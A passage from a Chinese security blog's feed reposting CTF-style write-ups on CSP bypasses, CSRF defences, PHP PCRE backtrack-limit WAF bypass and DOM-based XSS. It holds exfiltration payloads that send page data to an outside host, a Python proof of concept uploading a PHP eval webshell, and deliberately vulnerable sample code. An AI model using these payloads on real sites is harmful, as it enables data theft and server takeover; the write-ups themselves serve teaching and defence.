class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-774957c8-738e-1.png" alt="图片.png"><br>利用条件:</p><ol><li>可以上传svg图片</li></ol><h3 id="不完整的资源标签获取资源"><a href="#不完整的资源标签获取资源" class="headerlink" title="不完整的资源标签获取资源"></a>不完整的资源标签获取资源</h3><p>看看下面的例子，我们如何把flag给带出来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; img-src *;"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">"id"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的&lt;img标签来将数据带出</p><p>exp: <code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//VPS_IP?a=</code><br>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7753e788-738e-1.png" alt="图片.png"><br>需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或&lt;，否者不会发出<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-775a262a-738e-1.png" alt="图片.png"><br>利用条件:</p><ol><li>可以加载外域资源 (img-src: *)</li><li>需要获取页面某处的信息</li><li>不好总结，看上面例子，懂意思就行</li></ol><h3 id="CSS选择器获取内容"><a href="#CSS选择器获取内容" class="headerlink" title="CSS选择器获取内容"></a>CSS选择器获取内容</h3><p>这个来自2018 SECCON CTF的一道题，虽然原题中不是用来绕csp，但是也能拿过来利用，当然利用条件比较苛刻，需要<br>设置style-src为*，或者只设置了script-src<br>原题可以看看这篇文章<a href="https://www.yourhome.ren/index.php/sec/608.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/608.html</a><br>大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//这里引用的是上面文章中的exp</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^="6703"]</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"http://vps_ip/?6703"</span>);&#125;</span><br></pre></td></tr></table></figure><p>这句话的意思是，当input的value值已6703开头，则去加载后面的url，于是我们可以一位一位爆破，先猜第一位，再猜第二位。。。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; style-src 'unsafe-inline';img-src *"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"flag&#123;0xffff&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exp: <code>http://127.0.0.1/1.php?xss=&lt;style&gt;input[value^=&quot;flag{0xffff}&quot;] {background-image:url(&quot;http://47.106.65.216:1002/?flag{0xffff}&quot;)}%3C/style%3E</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7765f3ec-738e-1.png" alt="图片.png"><br>太苛刻了，之前想到随便提一下好了<br>利用条件:(好苛刻啊都不想写了)</p><ol><li>style允许内敛，img可以跨域</li><li>需要获取的数据在页面内</li><li>可以新建标签</li><li>可以多次发送xss且获取的数据不会变（毕竟不可能一次请求就注出来，除非能执行js写脚本一口气注）</li></ol><h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP<br>原题github <a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p><p>这个原理比较简单，就不写条件了</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>个人总结的一些csp绕过思路，并不是很全，若有不足，敬请批评补充</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/318#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/318#toc-3</a><br><a href="https://xz.aliyun.com/t/315/" target="_blank" rel="noopener">https://xz.aliyun.com/t/315/</a><br><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br><a href="https://inside.pixiv.blog/kobo/5137" target="_blank" rel="noopener">https://inside.pixiv.blog/kobo/5137</a><br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a><br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br><a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere</a><br><a href="https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8Csvg-xss/" target="_blank" rel="noopener">https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/</a><br><a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF 2018 rBlog writeup</a><br><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a><br><a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a><br><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a><br><a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" target="_blank" rel="noopener">https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md</a></p><hr><p>————————————————</p><p>原文链接：<a href="https://evoa.me/index.php/archives/53/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/53/</a></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2019/10/18/CSRF-1/"/>
      <url>/2019/10/18/CSRF-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="一、CSRF是什么"><a href="#一、CSRF是什么" class="headerlink" title="一、CSRF是什么"></a>一、<strong>CSRF是什么</strong></h2><p>首先，来看看CSRF是什么。依据Wikipedia的解释，含义如下：</p><blockquote><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称成为点击攻击或者会话劫持，通常缩写为CSRF或者XSRF，是一种恶意利用终端用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p><p><strong>Wikipedia</strong><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery" target="_blank" rel="noopener">Cross-site request forgery[1]</a></p></blockquote><p>通俗来讲，CSRF攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作。让我们通过两个例子来对这段晦涩的定义做出解释。</p><ol><li>一个网站用户 Alice 可能正在浏览聊天论坛，而同时另一个用户 Eve 也在此论坛中发布了一个具有 Alice 银行链接的图片消息。设想一下，Eve 编写了一个在 Alice 的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果 Alice 的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当 Alice 的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经 Alice 同意的情况下便授权了这次事务。</li><li>2009年黑客利用Gmail的一个CSRF漏洞，成功获取了好莱坞明星Vanessa Hudgens的独家艳照[2]。其攻击过程非常简单，给该明星的gmail账户发了一封email，标题是某大导演邀请你来看看这个电影，里面有个图片(该图片实际是Gmail转发的URL)，结果她登录Gmail，打开邮件就默默无闻的中招了，所有邮件被转发到黑客的账号。</li></ol><p>通过上面两个例子，可以总结出<strong>CSRF攻击的常见特性</strong>：</p><ul><li>依赖使用用户标识的网站；</li><li>利用网站对用户标识的信任；</li><li>欺骗用户的浏览器发送HTTP请求给目标站点；</li><li>依靠具有<a href="http://en.wikipedia.org/wiki/HTTP#Safe_methods" target="_blank" rel="noopener">side effect</a>[3]的HTTP请求。</li></ul><p><strong>CSRF攻击步骤</strong>如下：</p><ol><li>受害者必须在同一浏览器窗口（即使不是同一tab）内访问并登陆目标站点；</li><li>利用用户有效的Session cookie，从而利用受害者的身份进行恶意操作。</li></ol><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a><strong>防御</strong></h2><p>那么如何防御呢？大体来说，可以从服务端、客户端和安全设备这三个点来进行防御。</p><h3 id="服务端防御"><a href="#服务端防御" class="headerlink" title="服务端防御"></a>服务端防御</h3><p>目前业界服务端防御CSRF攻击主要有三种策略[7]：验证<code>HTTP Referer</code>字段，在请求地址中添加token并验证，在HTTP头中自定义属性并验证。下面分别简述之。</p><h4 id="1-验证HTTP-Referer字段"><a href="#1-验证HTTP-Referer字段" class="headerlink" title="1. 验证HTTP Referer字段"></a>1. 验证HTTP Referer字段</h4><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问<code>http://bank.test/test?page=10&amp;userID=101&amp;money=10000</code> 页面完成，用户必须先登录<code>bank.test</code>，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以<code>bank.test</code>域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以<code>bank.test</code>开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p><h4 id="2-在请求地址中添加token并验证"><a href="#2-在请求地址中添加token并验证" class="headerlink" title="2. 在请求地址中添加token并验证"></a>2. 在请求地址中添加token并验证</h4><p>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><h4 id="3-在HTTP头中自定义属性并验证"><a href="#3-在HTTP头中自定义属性并验证" class="headerlink" title="3. 在HTTP头中自定义属性并验证"></a>3. 在HTTP头中自定义属性并验证</h4><p>自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过<code>XMLHttpRequest</code>这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>对于普通用户来说，都学习并具备网络安全知识以防御网络攻击是不现实的。但若用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害。例如，用户上网时，不要轻易点击网络论坛、聊天室、即时通讯工具或电子邮件中出现的链接或者图片；及时退出长时间不使用的已登录账户，尤其是系统管理员，应尽量在登出系统的情况下点击未知链接和图片。除此之外，用户还需要在连接互联网的计算机上安装合适的安全防护软件，并及时更新软件厂商发布的特征库，以保持安全软件对最新攻击的实时跟踪。</p><p>另外，现在有一些浏览器插件可以进行简单的防御工作，但是有一些局限性。</p><h3 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h3><p>CSRF攻击的本质是攻击者伪造了合法的身份，对系统进行访问。如果能够识别出访问者的伪造身份，也就能识别CSRF攻击。研究发现，有些厂商的安全产品能基于硬件层面对HTTP头部的Referer字段内容进行检查来快速准确的识别CSRF攻击。但是这种方式代价昂贵，一般并不会采用这种防御方案。</p><p>一般而言，最常用的就是采用服务端防御策略。解决办法就是在Form表单加一个hidden field，里面是服务端生成的足够随机数的一个Token，使得黑客猜不到也无法仿照Token。</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PCRE绕过</title>
      <link href="/2019/10/17/PCRE%E7%BB%95%E8%BF%87/"/>
      <url>/2019/10/17/PCRE%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="0x01-正则表达式是什么"><a href="#0x01-正则表达式是什么" class="headerlink" title="0x01 正则表达式是什么"></a>0x01 正则表达式是什么</h2><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p><p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p><p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul><p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p><h2 id="0x02-回溯的过程是怎样的"><a href="#0x02-回溯的过程是怎样的" class="headerlink" title="0x02 回溯的过程是怎样的"></a>0x02 回溯的过程是怎样的</h2><p>所以，我们题目中的正则<code>&lt;\?.*[(</code>;?&gt;].*<code>，假设匹配的输入是</code>&lt;?php phpinfo();//aaaaa`，实际执行流程是这样的：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png" alt="image.png"></p><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符<code>[(</code>;?&gt;]`。</p><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(</code>;?&gt;]<code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配</code>;<code>，14步匹配</code>.<em><code>，第二个</code>.</em>`匹配到了字符串末尾，最后结束匹配。</p><p>在调试正则表达式的时候，我们可以查看当前回溯的次数：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/13ea3435-1e15-432b-b9f2-fa9805f4b00b.b2c963c22ff8.png" alt="image.png"></p><p>这里回溯了8次。</p><h2 id="0x03-PHP的pcre-backtrack-limit限制利用"><a href="#0x03-PHP的pcre-backtrack-limit限制利用" class="headerlink" title="0x03 PHP的pcre.backtrack_limit限制利用"></a>0x03 PHP的pcre.backtrack_limit限制利用</h2><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/f51c0775-1137-44bf-a366-f68b96e5358a.5d0b63e155b7.png" alt="image.png"></p><blockquote><p>这里有个有趣的事情，就是PHP文档中，中英文版本的数值是不一样的：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/e1ef3f44-8ea8-4156-94f4-f860e47e9152.d62407cb720d.png" alt="image.png"></p><p>我们应该以英文版为参考。</p></blockquote><p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/ad1ed05b-fab4-4316-96e0-06717ae7b444.829619d9800d.png" alt="image.png"></p><p>可见，<code>preg_match</code>返回的非1和0，而是false。</p><p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/e9effb6d-fd43-41aa-9bb8-1aab366649e6.a11361f8009b.png" alt="image.png"></p><p>所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p><p>对应的POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  &apos;file&apos;: BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&apos;http://51.158.75.42:8088/index.php&apos;, files=files, allow_redirects=False)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure><h2 id="0x04-PCRE另一种错误的用法"><a href="#0x04-PCRE另一种错误的用法" class="headerlink" title="0x04 PCRE另一种错误的用法"></a>0x04 PCRE另一种错误的用法</h2><p>延伸一下，很多基于PHP的WAF，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(preg_match(&apos;/SELECT.+FROM.+/is&apos;, $input)) &#123;</span><br><span class="line">    die(&apos;SQL Injection&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>均存在上述问题，通过大量回溯可以进行绕过。</p><p>另外，我遇到更常见的一种WAF是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123;</span><br><span class="line">    die(&apos;SQL Injection&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到了正则表达式的“非贪婪模式”。在NFA中，如果我输入<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p><ul><li><code>.+?</code>匹配到<code>/</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>*</code></li><li><code>S</code>匹配<code>*</code>失败，回溯，再由<code>.+?</code>匹配<code>*</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>a</code></li><li><code>S</code>匹配<code>a</code>失败，回溯，再由<code>.+?</code>匹配<code>a</code></li><li>…</li></ul><p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/abf469d4-eb83-416e-8cb3-caa5d59ffb6f.b6586a5d1f9b.png" alt="image.png"></p><h2 id="0x05-修复方法"><a href="#0x05-修复方法" class="headerlink" title="0x05 修复方法"></a>0x05 修复方法</h2><p>那么，如何修复这个问题呢？</p><p>其实如果我们仔细观察PHP文档，是可以看到<code>preg_match</code>函数下面的警告的：</p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/cfb5dda3-0643-45b0-9080-81c4a45cda56.d56b2d701229.png" alt="image.png"></p><p>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_php($data)&#123;  </span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(is_php($input) === 0) &#123;</span><br><span class="line">    // fwrite($f, $input); ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，即使正则执行失败返回false，也不会进入if语句。</p><p>————————————————</p><p>原文链接：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dom Based XSS</title>
      <link href="/2019/10/16/Dom-Based-XSS-1/"/>
      <url>/2019/10/16/Dom-Based-XSS-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a>DOM型XSS：</h2><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。允许程序或者脚本动态的访问或者更新文档内容，经过DOM解析触发XSS攻击，DOM型XSS不同与反射型XSS和存储型XSS，DOM型XSS不需要服务端参与解析响应，只是通过浏览器端的DOM进行解析。</p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h3 id="为何DOM型XSS"><a href="#为何DOM型XSS" class="headerlink" title="为何DOM型XSS"></a>为何DOM型XSS</h3><p>DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p><p>首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><p>如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var pos=document.URL.indexOf(&quot;name=&quot;)+5;</span><br><span class="line">document.write(decodeURI(document.URL.substring(pos,document.URL.length)));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>从代码层面看，漏洞形成原因很简单，<code>document.URL</code>获取用户输入，在代码中未经过任何过滤就传递给了<code>document.write</code>输出到当前页面中。</p><p>当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中：</p><p>也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS：</p><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><p>从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。</p><p>DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。</p><p>下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>储存型XSS</title>
      <link href="/2019/10/15/%E5%82%A8%E5%AD%98%E5%9E%8BXSS-1/"/>
      <url>/2019/10/15/%E5%82%A8%E5%AD%98%E5%9E%8BXSS-1/</url>
      
